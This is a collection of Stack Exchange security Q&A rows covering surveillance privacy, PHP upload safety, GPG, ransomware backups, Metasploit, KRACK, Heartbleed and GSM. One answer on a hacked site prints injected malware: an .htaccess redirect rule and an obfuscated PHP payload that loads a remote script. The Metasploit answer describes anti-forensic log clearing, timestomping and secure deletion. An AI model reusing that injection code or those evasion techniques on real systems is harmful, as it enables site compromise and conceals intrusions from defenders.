<p>I would start with greater adoption of PGP for emails, open source alternatives to web applications, and the use of VPNs. Are there any other (or better) steps that can be taken to minimize one's exposure to the surveillance dragnet?</p>
","<p><strong>Foreword:</strong> This problem isn't necessarily about governments. At the most general level, it's about online services giving their data about you (willingly or accidentally) to any third party. For the purposes of readability, I'll use the term ""government"" here, but understand that it could instead be replaced with any institution that a service provider has a compelling reason to cooperate with (or any institution the service could become totally compromised by -- the implications are reasonably similar). The advice below is generalizable to any case in which you want to use an external service while maintaining confidentiality against anyone who may have access to that service's data.</p>

<p>Now, to address the question itself:</p>

<blockquote>
  <p>...what steps can ordinary individuals take to safeguard themselves against the collection, and exposure, of such sensitive personal information?</p>
</blockquote>

<p>If you don't want the government of any nation to have access to your data, don't put it on a data-storage service that might possibly collude with a government agency of that nation.</p>

<p>For our model, let's assume that some government has access to your data stored on particular major services <em>at rest</em> (as well as their server logs, possibly). If you're dealing with a service that does storage (Google Drive, email) then SSL will do absolutely nothing to help you: maybe a surveillance effort against you cannot see what you're storing <em>as you're sending it over the wire</em>, but they can see what you've stored <em>once you've stored it</em>.</p>

<p>Presumably, such a government could have access to the same data about you that Google or Microsoft or Apple has. Therefore, the problem of keeping information secret from surveillance reduces to the problem of keeping it secret from the service provider itself (i.e., Google, MS, Apple, etc.). Practically, I might offer the specific tips to reduce your risk of data exposure:</p>

<ol>
<li><p>If there's some persistent information (i.e., a document) you don't want some government to see, don't let your service provider see it either. That means either <em>use a service you absolutely trust</em> (i.e., an installation of <a href=""http://www.fengoffice.com/web/"" rel=""noreferrer"">FengOffice</a> or <a href=""http://etherpad.org/"" rel=""noreferrer"">EtherPad</a> that's running off your <a href=""http://en.wikipedia.org/wiki/SheevaPlug"" rel=""noreferrer"">SheevaPlug</a> at home (provided you trust the physical security of your home, of course)) or use encryption at rest -- i.e., encrypt your documents with a strong cipher <em>before</em> you send them to Google Drive (I might personally recommend AES, but see the discussion below in the comments).</p>

<ul>
<li>In fact, this second strategy is exactly how <a href=""https://www.clipperz.com/blog/2007/08/24/anatomy_zero_knowledge_web_application/"" rel=""noreferrer"">""host-proof"" Web applications</a> work (also called ""zero-knowledge"" applications, but unrelated to the concept of <a href=""https://en.wikipedia.org/wiki/Zero-knowledge_proof"" rel=""noreferrer"">zero-knowledge proofs</a>). The server holds only encrypted data, and the client does encryption and decryption to read and write to the server.</li>
</ul></li>
<li><p>For personal information that you don't need persistent access to, like your search history, you can probably prevent that information from being linked back to you personally by confusing the point of origin for each search using a VPN or onion routing like <a href=""https://www.torproject.org/"" rel=""noreferrer"">Tor</a>.</p></li>
</ol>

<p>I'm reminded of <a href=""https://xkcd.com/1150/"" rel=""noreferrer"">this xkcd</a>:</p>

<p><img src=""https://i.stack.imgur.com/5Ud6q.png"" alt="""">:</p>

<p>Once a service has your data, it's impossible to control what that service does with it (or how well that service defends it). If you want control of your data, <em>don't give it away</em>. If you want to keep a secret, <em>don't tell it to anyone</em>. So long as the possibility of surveillance collusion or data compromise against a service is non-trivially high, do not expect your externally-stored data to be private from inspection by any government, even if you had expected that data to be generally private.</p>

<p>A separate question is whether there will be any significant <em>actual</em> impact to the average internet user from such information-gathering programs. It's impossible to say, at least in part because it's impossible to transparently audit the behavior of people involved in a secret information-collection program. In fact, there could be impact from such a program that would be impossible for the general public to recognize <em>as</em> impact from such a program.</p>

<p>In the case of NSA in particular, NSA is chartered to deal with <em>foreign</em> surveillance, so U.S. citizens are not generally targets for analysis, unless perhaps they happen to have a foreign national nearby in their social graph. The NSA publicly makes an effort <em>not</em> to collect information about U.S. citizens (though the degree to which this is followed in practice is impossible to verify, as discussed above).</p>
","37092"
"Risks of a PHP image upload form","27326","","<p>My client wants a photography site where users can upload their photos in response to photography competitions. Though technically this isn't a problem, I want to know the risks associated with allowing any user to upload any image onto my server. I've got the feeling the risks are high...</p>

<p>I was thinking of using something like this <a href=""http://www.w3schools.com/php/php_file_upload.asp"">http://www.w3schools.com/php/php_file_upload.asp</a> </p>

<p>If I do let anonymous users upload files, how can I secure the directory into which the images (and potentially malicious files) will be uploaded?</p>
","<p>The biggest concern is obviously that malicious users will upload things that are not images to your server. Specifically they might upload executable files or scripts which they will attempt to trick your server into executing.</p>

<p>One way to protect against this is to make sure that the files are not executable after you <code>move_uploaded_file</code> in PHP. This is as simple as <a href=""http://php.net/manual/en/function.chmod.php"">using <code>chmod()</code></a> to set 644 permissions.</p>

<p>Note that a user <strong>can still upload PHP scripts or other scripts and trick Apache into executing them</strong> depending on your configuration.</p>

<p>To avoid this, call <a href=""http://php.net/manual/en/function.getimagesize.php""><code>getimagesize()</code></a> on the files after they are uploaded and determine what file type they are. <strong>Rename the files to a unique filename and use your own extension</strong>. That way, if a user uploads <code>evil.jpg.php</code>, your script will save that as <code>12345.jpg</code> and it won't be executable. Better yet, your script will not even touch it as it will be an invalid JPEG.</p>

<p>I personally always rename uploaded images to either the current timestamp from <code>time()</code> or a UUID. This also helps prevent against very evil filenames (like someone trying to upload a file they've named <code>../../../../../../../../etc/passwd</code>)</p>

<p>As further protection you can use what's sometimes known as an ""Image Firewall"". Basically this involves saving uploaded images to a directory which is <em>outside</em> the Document Root and displaying them via a PHP script which calls <a href=""http://php.net/readfile""><code>readfile()</code></a> to display them. This might be a lot of work but is the safest option.</p>

<p>A secondary concern is users uploading too many files or files which are too large, consuming all the disk space available or filling the hosting user's quota. This can be managed within your software, including limiting the size of individual files, the amount of data one user can upload, the total size of all uploads, etc. Make sure the website admin user has a way to manage and delete these files.</p>

<p><strong>Do not</strong> rely on any of the data in <code>$_FILES</code>. Many sites tell you to check the mime type of the file, either from <code>$_FILES[0]['type']</code> or by checking the filename's extension. <strong>Do not do this</strong>. Everything under <code>$_FILES</code> with the exception of <code>tmp_name</code> <em>can be manipulated by a malicious user</em>. <strong>If you know you want images only call <code>getimagesize</code> as it actually reads image data and will know if the file is really an image.</strong></p>

<p><strong>Do not</strong> rely on checking the HTTP Referrer for any security. Many sites advise you to check to make sure that the referrer is your own site to ensure that the file is legitimate. This can easily be faked.</p>

<p>For further information, here are some good articles:</p>

<ul>
<li><a href=""http://software-security.sans.org/blog/2009/12/28/8-basic-rules-to-implement-secure-file-uploads/"">http://software-security.sans.org/blog/2009/12/28/8-basic-rules-to-implement-secure-file-uploads/</a></li>
<li><a href=""http://nullcandy.com/php-image-upload-security-how-not-to-do-it/"">http://nullcandy.com/php-image-upload-security-how-not-to-do-it/</a></li>
<li><a href=""http://www.acunetix.com/websitesecurity/upload-forms-threat/"">http://www.acunetix.com/websitesecurity/upload-forms-threat/</a></li>
<li><a href=""http://josephkeeler.com/2009/04/php-upload-security-the-1x1-jpeg-hack/"">http://josephkeeler.com/2009/04/php-upload-security-the-1x1-jpeg-hack/</a></li>
</ul>
","32853"
"Lost passphrase recovery for SSL","27305","","<p>Today is friday and I'm a desperate sysadmin. I issued a demand of certificate for an HTTPS server, and just received it after more than a long week of waiting, but while my request was processed I lost the passphrase that secured my private key.</p>

<p>Given that I have the private key and the public key jointly generated with the passphrase (that I knew by the time), could there be a clever way to recover the lost passphrase.</p>

<p>Thanks in advance.</p>
","<p>You are out of luck.  A passphrase protected encrypted private key means you have to guess it and with the high entropy of a typical passphrase it will be very difficult.  Granted if you have a rough idea of what the passphrase is, you can write a script to try to brute force it (e.g., it was something like 'correct battery horse <em>_</em>_' and subject to a dictionary attack). </p>

<p>This is the whole reason you put the passphrase on the private key.  (Granted I usually remove the passphrase from my SSL private keys on my server for convenience restarting apache/nginx; though leave them only root readable; figure if someone got to root they can install a keylogger and grab my passphrase anyhow).</p>

<p>EDIT: I should add in principle you could get at your private key if you break RSA (solve the problem of factoring the modulus N the product of two ~1024 bit prime numbers that's in the unencrypted public key; which would let you quickly regenerate the private key) or the passphrase encryption mechanism (typically DES3) to recover the private key.  However, if you could do either then anyone else could as well, which would not be a good situation.  Also, unless you have made fundamental breakthroughs in number theory, computer science, or developed a quantum computer it is prohibitively expensive to brute-force break RSA (like a <a href=""http://www.digicert.com/TimeTravel/math.htm"">million computers going for a million years</a> would have under a 0.02% chance of breaking a 2048-bit RSA key).</p>
","17760"
"gpg --encrypt fails","27239","","<p>When trying to encrypt files, I get the following error in KGpg editor window:</p>

<blockquote>
  <p>The encryption failed with error code 2</p>
</blockquote>

<p>On the command line I get:</p>

<pre><code>$ gpg --list-keys
/home/user/.gnupg/pubring.gpg
 ---------------------------------
pub   2048D/5E04B919 2012-02-02 [expires: 2016-02-01]
uid                  Firstname Lastname &lt;email.address@domain.com&gt;
uid                  [jpeg image of size 4005]

$ 
$ gpg --encrypt file-to-encrypt
You did not specify a user ID. (you may use ""-r"")

Current recipients:

Enter the user ID.  End with an empty line: email.address@domain.com
No such user ID.
</code></pre>

<p>This used to work both with editor and on the command line with the same key. The <code>Current recipients:</code> is empty. Why is that?</p>

<p><strong>UPDATE:</strong></p>

<p>When trying to specify the user ID on the command line using the <code>-r</code> option, I get the following:</p>

<pre><code>$ gpg -r email.address@domain.com --encrypt file-to-encrypt
gpg: email.address@domain.com: skipped: unusable public key
gpg: file-to-encrypt: encryption failed: unusable public key
</code></pre>

<p>Info: </p>

<pre><code>$ lsb_release -a
No LSB modules are available.
Distributor ID: Ubuntu
Description:    Ubuntu 12.10
Release:        12.10
Codename:       quantal

$ dpkg -s gnupg
Package: gnupg
Status: install ok installed
Priority: important
Section: utils
Installed-Size: 1936
Maintainer: Ubuntu Developers &lt;ubuntu-devel-discuss@lists.ubuntu.com&gt;
Architecture: amd64
Multi-Arch: foreign
Version: 1.4.11-3ubuntu4.4
</code></pre>
","<p>I figured out what the problem and solution was so I give an answer with details should anyone run into the same problem, it may be helpful.</p>

<p>The problem is somewhat ambiguous, no really informative error message is given.</p>

<p>It turned out that the encryption sub-key was expired. Strangely, <code>gpg --list-keys</code> did NOT show the expired sub-key!! Once the sub-key expiry was extended, it was included in the output of <code>gpg --list-keys</code>.</p>

<p>Also, <code>KGpg</code> does not show in any way that the sub-key is expired nor it allows to extend the expiry of the sub-key (only the main key's expiry can be changed).</p>

<p>The output of <code>gpg --list-keys</code> before the solution (I changed personal details):</p>

<pre><code>$ gpg --list-keys
/home/user/.gnupg/pubring.gpg
---------------------------------
pub   2048D/5E04B919 2012-02-02 [expires: 2016-02-01]
uid                  Firstname Lastname &lt;email.address@domain.com&gt;
uid                  [jpeg image of size 4005]
</code></pre>

<p>Nothing more.</p>

<p>However, <code>gpg --edit 5E04B919</code> showed that the sub-key is expired</p>

<pre><code>$ gpg --edit 16AE78C5
gpg (GnuPG) 1.4.11; Copyright (C) 2010 Free Software Foundation, Inc.
This is free software: you are free to change and redistribute it.
There is NO WARRANTY, to the extent permitted by law.

Secret key is available.

pub  2048D/5E04B919  created: 2012-02-02  expires: 2016-02-01  usage: SCA 
                     trust: ultimate      validity: ultimate
sub  1024g/16AE78C5  created: 2012-02-02  expired: 2014-02-01  usage: E   
[ultimate] (1). Firstname Lastname &lt;email.address@domain.com&gt;
[ultimate] (2)  [jpeg image of size 4005]

gpg&gt;
</code></pre>

<p>After some Google search, I found this mailing list archive which pointed me to the right direction to extend the expiry of the sub-key using <code>gpg</code> command line:</p>

<p><a href=""http://lists.gnupg.org/pipermail/gnupg-users/2005-June/026063.html"">http://lists.gnupg.org/pipermail/gnupg-users/2005-June/026063.html</a></p>

<p>I followed the instructions and extended the sub-key expiry. After this <code>gpg --list-keys</code> gave a different output:</p>

<pre><code>$ gpg --list-keys
/home/user/.gnupg/pubring.gpg
---------------------------------
pub   2048D/5E04B919 2012-02-02 [expires: 2016-03-12]
uid                  Firstname Lastname &lt;email.address@domain.com&gt;
uid                  [jpeg image of size 4005]
sub   1024g/16AE78C5 2012-02-02 [expires: 2016-03-12]
</code></pre>

<p>After this, everything was back to normal, I could encrypt files, etc.</p>
","53309"
"Are cloud storage services a good strategy to protect against ransomware attacks?","27202","","<p>I have been reading a lot here about Ransomware attacks and I am wondering if my strategy for protecting myself is valid or not.</p>

<p>I have 10Gb of personal data and 90Gb of photos and videos. I have them in D:\ drive in two separate folders. Personal data folder is synced with Google Drive. Photos are synced with a similar tool (Hubic).
This way every new photo I copy to D:\ drive is soon sent to Cloud Storage. If my hard drive dies or is stolen I still have my online copy.</p>

<p>But in case I suffer a Ransomware attack, I am thinking it might not be good as possibly the data would be deleted/encrypted also in Google Drive.
So my question is:</p>

<ul>
<li><p>Is my method of syncing my data to online storage services (Google Drive, Dropbox, etc.) a good way to protect myself against Ransomware?</p></li>
<li><p>Is there a better backup strategy for ensuring I can recover from Ransomware?</p></li>
</ul>

<p><strong>Note</strong>: There is a similar <a href=""https://security.stackexchange.com/questions/14159/it-is-safe-to-store-photos-and-documents-on-skydrive-google-cloud-services"">question</a> here but it focuses on if the online storage vendor can be trusted or not. In my case I choose to trust them, so, given a successful Ransomware attack, would I have a backup to ignore Ransomware demands.</p>
","<p>I'm not sure about Google Drive, but Dropbox provides a way to recover previous file versions, a feature that wouldn't be impacted by the ransomware, since it relies on a file copies on the Dropbox servers. So it'd certainly be a way of protecting your data. </p>

<p>However, recovering everything over your internet connection is a relatively slow process. Personally, I would use a NAS device, but wouldn't map it as a network drive (because those can - and will be influenced if a ransomware is activated on your computer). I would use it via FTP / SFTP, probably with a script that syncs the files on a regular basis. This way you have the files locally, which makes restoring from an attack less of a problem. It is probably cheaper too.</p>

<p>Also, if you prefer Dropbox-like experience, you might want to try ownCloud on your own device - it also keeps the previous versions of file, allowing you to roll back in case of file damage or corruption. Keep in mind that storing multiple old versions of a file takes space on your NAS's disk(s). </p>
","120812"
"Do actual penetration testers actually use tools like metasploit?","27189","","<p>I've played around with metasploit simply as a hobby but am wondering if actual <a href=""http://en.wikipedia.org/wiki/Penetration_test"">pentesters</a> and/or hackers actually use metasploit to get into systems or do they write their own post exploitation modules or their own programs entirely? </p>

<p>Reason I ask is because metasploit does not seem to be able to selectively clear windows event logs and such, or perhaps I just couldn't find it.(the nearest I can find is clearev but that simply wipes out everything which isn't very sneaky) Besides, even if it is able to selectively clear the event logs there will be places like the prefetch queue in ring 0 where forensics will be able to find what I did from the system image...</p>
","<p>As far as forensics is concerned, Metasploit have payloads which are specifically designed to make the work of forensic analysis more difficult. For example, the most famous payload which is selected by default with a lot of exploit modules is the meterpreter payload. It completely runs in-memory and don't touch the disk for any operations (unless specifically asked by the user). Which means there will be no evidence in the prefetch folder or any other place on the disk.<br/></p>

<p>You don't have to clear all the event logs. You can selective clear any event log you want through the meterpreter script <a href=""https://github.com/rapid7/metasploit-framework/blob/master/scripts/meterpreter/event_manager.rb"">event_manager</a>.</p>

<p>Meterpreter has a tool called <a href=""https://github.com/rapid7/metasploit-framework/blob/master/lib/rex/post/meterpreter/ui/console/command_dispatcher/priv/timestomp.rb"">timestomp</a> which can change the modification, access, creation, and execution time of any file on the hard disk to any arbitrary value. You can securely wipe out any file with the <a href=""https://github.com/rapid7/metasploit-framework/blob/master/modules/post/windows/manage/sdel.rb"">sdel</a> (safe delete) module which not only securely wipe the file contents but rename the file to a long random string before the deletion which makes the forensic recovery of not only the contents but the file meta data very difficult as well.<br/></p>

<p>Now comes to your second part of the use of Metasploit by actual malicious attackers in real world attacks. There have been <a href=""http://www.f-secure.com/weblog/archives/00002403.html"">reports</a> that Metasploit was used in one of the attacks on the Iranian nuclear facility. The reason you don't see Metasploit more often is due the open source nature of the product. Since the exploits and payloads are available to everyone, by default every security product such as antivirus, IDS/IPS etc consider these files as malicious. The defense industry has gone to an extent that even if one create a completely benign file with Metasploit, it will be detected by almost all the AV solutions. Generate an empty payload like:</p>

<pre><code>echo -n | msfencode -e generic/none -t exe &gt; myn.exe
</code></pre>

<p>Upload it to VirusTotal and you will see that more than half of the AV solutions detect it as malicious. More details can be found on the Matt Weeks' blog <a href=""http://www.scriptjunkie.us/2011/04/why-encoding-does-not-matter-and-how-metasploit-generates-exes/"">here</a>.</p>

<p>With this behavior no attacker will risk using Metasploit for actual attacks due to the very high detection rate. The modules can be easily customized and bypassing AV and other security controls through Metasploit is quite easy as well. However, at that point it is difficult to determine if the payload is written from the scratch or the Metasploit module has been modified. Therefore, it is difficult to say for sure how many attackers have used or continue to use Metasploit in their operations. </p>
","60640"
"Consequences of the WPA2 KRACK attack","27185","","<p>Today new research was published on vulnerabilities in wireless network security called <a href=""https://www.krackattacks.com/#paper"" rel=""noreferrer"">Krack</a>.</p>

<p>What are the real-world consequences of these attacks for users and owners of wireless networks, what can an attacker actually do to you?</p>

<p>Also is there anything a wireless network owner can do apart from contact their vendor for a patch?</p>
","<p>Citing the relevant parts from <a href=""https://www.krackattacks.com"" rel=""noreferrer"">https://www.krackattacks.com</a>:</p>

<p><strong>Who is vulnerable?</strong></p>

<p>Both clients and access points are listed in <a href=""https://papers.mathyvanhoef.com/ccs2017.pdf"" rel=""noreferrer"">the paper</a> as being vulnerable. See the tables 1 and 2 on pages 5 and 8 for examples of vulnerable systems, and table 3 on page 12 for an overview of which packets can be decrypted.</p>

<blockquote>
  <p>The weaknesses are in the Wi-Fi standard itself, and not in individual products or implementations. Therefore, any correct implementation of WPA2 is likely affected. [...] the attack works against personal and enterprise Wi-Fi networks, against the older WPA and the latest WPA2 standard, and even against networks that only use AES.</p>
</blockquote>

<p><strong>What is the impact?</strong></p>

<ul>
<li><blockquote>
  <p>adversaries can use this attack to <strong>decrypt packets sent by clients</strong>, allowing them to intercept sensitive information such as passwords or cookies.</p>
</blockquote></li>
<li><blockquote>
  <p>The ability to decrypt packets can be used to decrypt TCP SYN packets. This allows an adversary to [...] hijack TCP connections. [An adversary can thus inject] malicious data into unencrypted HTTP connections.</p>
</blockquote></li>
<li><blockquote>
  <p>If the victim uses either the <strong>WPA-TKIP or GCMP</strong> encryption protocol, instead of AES-CCMP, the impact is especially catastrophic. Against these encryption protocols, nonce reuse enables an adversary to not only decrypt, but also to <strong>forge and inject packets.</strong></p>
</blockquote></li>
<li><blockquote>
  <p>our attacks do <strong>not</strong> recover the password of the Wi-Fi network</p>
</blockquote></li>
</ul>

<p>(Emphases mine.)</p>

<p><strong>Can we patch it</strong> (and will we have incompatible APs/clients)?</p>

<p>There is a fix for both APs and clients, it doesn't matter which one you patch first.</p>

<blockquote>
  <p>implementations can be patched in a backwards-compatible manner [...] To prevent the attack, users must update affected products as soon as security updates become available. [...] a patched client can still communicate with an unpatched access point, and vice versa.</p>
</blockquote>

<p>However, both client and router must be patched (or confirmed secure):</p>

<blockquote>
  <p>both the client and AP must be patched to defend against all attacks [...] it might be that your router does not require security updates. We strongly advise you to contact your vendor for more details [...] For ordinary home users, your priority should be updating clients such as laptops and smartphones.</p>
</blockquote>

<p><strong>How does it work?</strong></p>

<blockquote>
  <p>When a client joins a network, it [...] will install this key after receiving message 3 of the 4-way handshake. Once the key is installed, it will be used to encrypt normal data frames using an encryption protocol. However, because messages may be lost or dropped, the Access Point (AP) will retransmit message 3 if it did not receive an appropriate response as acknowledgment. [...] Each time it receives this message, it will reinstall the same encryption key, and thereby reset the incremental transmit packet number (nonce) and receive replay counter used by the encryption protocol. We show that an attacker can force these nonce resets by collecting and replaying retransmissions of message 3 of the 4-way handshake. By forcing nonce reuse in this manner, the encryption protocol can be attacked, e.g., packets can be replayed, decrypted, and/or forged.</p>
</blockquote>

<p><strong>Is there anything a wireless network owner can do apart from contact their vendor for a patch?</strong></p>

<p>As mentioned, WPA-TKIP or GCMP are slightly worse, so make sure you use AES-CCMP for the lowest impact -- if your router allows you to choose that (many don't). Other than that, you can't truly mitigate it on a protocol level yourself. Just update as soon as possible.</p>

<p>Generally, use HTTPS for anything that needs to be secure (you should do this anyway, also over ethernet, but <em>especially</em> over Wi-Fi now), use a VPN as an extra layer, etc.</p>
","171358"
"How to prevent my website from getting malware injection attacks?","27133","","<p>My website was banned as a malware website by Google. When I checked the code, I found out that some code injected many files on my server. I cleaned everything manually, edited all files on my server (shared hosting) by searching some code from the injected code in all the files. Even the .htaccess file was modified by the attacker.</p>

<p>There were two WordPress installations on the website, in two different subfolders of the website root, which were not updated. I updated both.</p>

<p>Then Google removed ban on my website.</p>

<p>Yesterday, I found out that the .htaccess file on my website was again modified by the attacker. Here is the code:</p>

<pre><code>#b58b6f#
&lt;IfModule mod_rewrite.c&gt;
RewriteEngine On
RewriteCond %{HTTP_REFERER} ^.*(abacho|abizdirectory|acoon|alexana|allesklar|allpages|allthesites|alltheuk|alltheweb|altavista|america|amfibi|aol|apollo7|aport|arcor|ask|atsearch|baidu|bellnet|bestireland|bhanvad|bing|bluewin|botw|brainysearch|bricabrac|browseireland|chapu|claymont|click4choice|clickey|clickz|clush|confex|cyber-content|daffodil|devaro|dmoz|dogpile|ebay|ehow|eniro|entireweb|euroseek|exalead|excite|express|facebook|fastbot|filesearch|findelio|findhow|finditireland|findloo|findwhat|finnalle|finnfirma|fireball|flemiro|flickr|freenet|friendsreunited|gasta|gigablast|gimpsy|globalsearchdirectory|goo|google|goto|gulesider|hispavista|hotbot|hotfrog|icq|iesearch|ilse|infoseek|ireland-information|ixquick|jaan|jayde|jobrapido|kataweb|keyweb|kingdomseek|klammeraffe|km|kobala|kompass|kpnvandaag|kvasir|libero|limier|linkedin|live|liveinternet|lookle|lycos|mail|mamma|metabot|metacrawler|metaeureka|mojeek|msn|myspace|netscape|netzindex|nigma|nlsearch|nol9|oekoportal|openstat|orange|passagen|pocketflier|qp|qq|rambler|rtl|savio|schnellsuche|search|search-belgium|searchers|searchspot|sfr|sharelook|simplyhired|slider|sol|splut|spray|startpagina|startsiden|sucharchiv|suchbiene|suchbot|suchknecht|suchmaschine|suchnase|sympatico|telfort|telia|teoma|terra|the-arena|thisisouryear|thunderstone|tiscali|t-online|topseven|twitter|ukkey|uwe|verygoodsearch|vkontakte|voila|walhello|wanadoo|web|webalta|web-archiv|webcrawler|websuche|westaustraliaonline|wikipedia|wisenut|witch|wolong|ya|yahoo|yandex|yell|yippy|youtube|zoneru)\.(.*)
RewriteRule ^(.*)$ http://www.couchtarts.com/media.php [R=301,L]
&lt;/IfModule&gt;
#/b58b6f#
</code></pre>

<p>I searched for ""b58b6f"" in all the files, but I don't find any. I think this is the only file modified by the most recent attack. I deleted this .htaccess file, as I don't need it.</p>

<p>How was the hacker able to hack my website? How to prevent this to happen again? How I can make my website more secure?</p>
","<p>It seems that the malware you encountered is the ""daysofyorr.com virus"" or <a href=""http://www.peterglowka.de/daysofyorr-release-virus-entfernen/"" rel=""nofollow"">MW:HTA:7</a>.</p>

<p>I'm suggesting that you to use FileZilla as the FTP client. If so, you must know that FileZilla store the credentials of your websites in plain text. A virus may have accessed your credentials, and then accessed all your registered websites searching for WordPress install in order to update the files by inserting this code.</p>

<p>Now, you should:</p>

<ul>
<li>Search your computer for any viruses, malware, etc.</li>
<li>Change the FTP password of all your registered FTP accounts saved in FileZilla</li>
<li>Eventually use a better FTP system, like WinSCP</li>
</ul>

<blockquote>
  <p>A late comment, but I suspect that you use FileZilla as your FTP
  client. Did you know that FileZilla stores your FTP site credentials
  (site/user/pass) in a plain text file in the %APPDATA% folder?</p>
  
  <p>And I also suspect there is a hidden malware on your computer. It
  grabbed your FileZilla credential files, and used them to change your
  <code>header.php</code> file in your theme folder. In fact, I suspect that you will
  find changed <code>header.php</code> in <em>all</em> of your themes folders.</p>
  
  <p>And if you are technical enough to look at your FTP log files, you
  will find the access to those files: a download, then an upload of the
  changed files. You might also find some random file names that were
  uploaded to your root ('home') folder, although those files were
  deleted by the hacker.</p>
  
  <p>And, you will find that the IP address in the FTP log of the hacker
  was from China.</p>
  
  <p>Recommendation: uninstall FileZilla, delete the FileZilla folder from
  %APPDATA% folder, change your FTP passwords (and your host passwords).
  And look for any changed <code>header.php</code>, <code>footer.php</code>, and <code>wp-settings.php</code>
  files.</p>
</blockquote>

<p>For the ""daysofyorr.com virus"", you can confirm this by checking some of your PHP files (like <code>index.php</code>), if you find this code:</p>

<pre><code>#b58b6f#
echo(gzinflate(base64_decode(“JctRCoAgDADQq8gO4P5DvcuwRUm hbKPl7fvw98FLWuUaFmwOzmD8GTZ6aSkElZrhNBsborvHnab2Y3a RWPuDwjeTcmwKJeFK5Qc=”)));
#/b58b6f#
</code></pre>

<p>That's it!</p>

<p>For information, it translate into:</p>

<pre><code>&lt;script type=""text/javascript"" src=""http://www.daysofyorr.com/release.js""&gt;&lt;/script&gt;
</code></pre>

<p>Which seems to lead to a 404 nowadays.</p>
","16364"
"How reliable is a write protection switch on a USB flash drive?","27118","","<p>I'm currently using a USB flash drive with a live distribution. At times I would plug it into terminals I cannot trust.</p>

<p>My threat model here is solely <strong>the risk of unauthorized modifications to the live distribution image on the flash drive</strong>. Unfortunately, a live CD is not convenient enough (the file system has to allow writes when used on a secure terminal and constant remastering is too cumbersome).</p>

<p>I'm <strong>considering now if a physical write protect (read only) switch on the flash drive is reliable enough to be trusted</strong>. I mean such as can be seen on older flash drives (e.g. <a href=""http://www.pqi.com.tw/product2.asp?cate1=18&amp;proid=301"">PQI U339H</a>).</p>

<p>From what I've found so far, the write protection is said to be done completely on hardware level, but I couldn't verify if there's indeed no way to circumvent it. For sure with SD cards there is (as it's basically software level information that doesn't have to be respected by rogue systems).</p>

<p>For instance the <a href=""http://www.sdcard.org/developers/tech/pls/simplified_specs/Part_1_Physical_Layer_Simplified_Specification_Ver_3.01_Final_100518.pdf"">SD Simplified Specification</a> describes it as:</p>

<blockquote>
  <p><strong>4.3.6 Write Protect Management</strong> </p>
  
  <p>Three write protect methods are
  supported in the SD Memory Card as
  follows: </p>
  
  <ul>
  <li><em>Mechanical write protect switch (Host responsibility only)</em> </li>
  <li><em>Card internal write protect (Card's responsibility)</em> </li>
  <li><em>Password protection card lock operation.</em></li>
  </ul>
  
  <p><strong>Mechanical Write Protect Switch</strong> </p>
  
  <p>A mechanical sliding tablet on the
  side of the card (refer to the Part 1
  Mechanical Addenda) will be used by
  the user to indicate that a given card
  is write  protected or not. [...]</p>
  
  <p>A proper, matched, switch on the
  socket side will indicate to the host
  that the card is write-protected or
  not. It is the responsibility of the
  host to protect the card. The position
  of the write protect switch is unknown
  to the internal circuitry of the card.</p>
  
  <p>[...]</p>
</blockquote>

<p>Do you know of some similar <strong>technical explanation of how this kind of write protection works</strong> on USB flash drives and would relying on it for security be wise?</p>
","<p>Physical write protect on a USB drive should work in all cases. The write controller is in the drive itself. Thus, excepting a wholly insane implementation, the physical write protect switch is secure.</p>

<p>Physical write protect is always kind of a semi-soft thing, but it's usually at the drive internals. With a floppy drive where the controller is external to the device, one could craft a drive that ignored the write-protect slider. I think SD cards are the same as floppy drives in that regard, though I won't make a bet on it because I know those include some circuitry for things like wear-leveling.</p>
","4266"
"Does the HeartBleed vulnerability affect Apache Tomcat servers using Tomcat Native?","26919","","<p>Are Apache Tomcat servers using Tomcat Native &amp; APR vulnerable to the HeartBleed OpenSSL bug, or does this layer insulate them?
<a href=""http://tomcat.apache.org/native-doc/"">http://tomcat.apache.org/native-doc/</a></p>

<p>HeartBleed OpenSSL bug information: <a href=""http://heartbleed.com/"">http://heartbleed.com/</a></p>

<p>On my Apache Tomcat server, I have:</p>

<ul>
<li>A vulnerable version of OpenSSL</li>
<li>Built and installed APR</li>
<li>Built and installed Tomcat Native using <strong>--with-apr</strong> and <strong>--with-ssl</strong></li>
<li>Tomcat is handling requests directly. A Connector on port 443 is configured with attributes SSLEnabled, SSLProtocol, SSLCipherSuite, SSLCertificateFile, SSLCertificateKeyFile, SSLCertificateChainFile
<ul>
<li>SSLProtocol=""-ALL +SSLv3 +TLSv1""</li>
<li>SSLCipherSuite=""ALL:!aNULL:!eNULL:!ADH:RC4+RSA:+HIGH:+MEDIUM:!LOW:!SSLv2:!EXPORT""</li>
</ul></li>
</ul>

<p><strong>Questions:</strong></p>

<ul>
<li>Do versions of Tomcat, APR, or Tomcat Native have any affect on vulnerability?</li>
<li>Do SSLProtocol or SSLCipherSuite values affect vulnerability?</li>
</ul>
","<p>According to the document you linked to, the APR connector</p>

<blockquote>
  <ul>
  <li>Uses OpenSSL for TLS/SSL capabilities (if supported by linked APR library)</li>
  </ul>
</blockquote>

<p>Therefore, it would be reasonable to assume that the Tomcat Native Library would be vulnerable to the Heartbleed bug.  However, the conditions are different, because Tomcat is written in Java, and Java has its own allocation system (the famous garbage collector) which obtains memory from the OS by huge blocks, quite apart from the zones where OpenSSL obtains its blocks.</p>

<p>Thus, the heartbleed buffer overrun is unlikely to reveal any secret information which exists as Java-based object. It may, however, obtain information which is allocated from the same heap as where OpenSSL obtains its own buffers. In particular, it is <em>possible</em> that the vulnerability may reveal part or all of the private key used by OpenSSL itself.</p>
","55148"
"Are phone calls on a GSM network encrypted?","26880","","<p>When I make a call on my cellphone (on a GSM network), is it encrypted?</p>
","<p>For the most part<sup>[1]</sup> they are encrypted, but not sufficiently enough to be considered as safe, tap resistant encryption. <a href=""https://en.wikipedia.org/wiki/GSM"">GSM</a> uses <a href=""https://en.wikipedia.org/wiki/A5/1"">64-bit A5/1 encryption</a> that is weak, to say the least. <a href=""http://arstechnica.com/gadgets/2010/12/15-phone-3-minutes-all-thats-needed-to-eavesdrop-on-gsm-call/"">$15 phone, 3 minutes all that’s needed to eavesdrop on GSM call</a> article from <a href=""http://arstechnica.com/"">ArsTechnica</a> covers it pretty well IMO, if you care to read more about it.</p>

<p>However, it also depends on what you mean by <em>GSM</em>. What I mentioned above is true for what we usually mean as GSM (<a href=""https://en.wikipedia.org/wiki/2G"">2G</a>, or second generation protocols). <a href=""https://en.wikipedia.org/wiki/3G"">3G</a> are generally considered <em>slighly</em> safer (for lack of a better word):</p>

<blockquote>
  <p>3G networks offer greater security than their 2G predecessors. By
  allowing the UE (User Equipment) to authenticate the network it is
  attaching to, the user can be sure the network is the intended one and
